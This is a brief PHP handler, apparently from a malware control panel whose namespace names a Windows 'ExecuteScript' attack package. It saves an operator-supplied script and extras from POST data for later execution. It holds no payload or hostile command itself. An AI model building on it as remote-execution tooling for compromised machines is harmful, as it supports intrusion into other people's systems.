<?php

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExecuteScript\ExecuteScript;

/** @var ExecuteScript $this */

$script = $this->requestData->postCheck("script");
$extras = $this->requestData->postCheck("extras");

$this->setScript($script);
$this->setExtras($extras);
$this->saveState();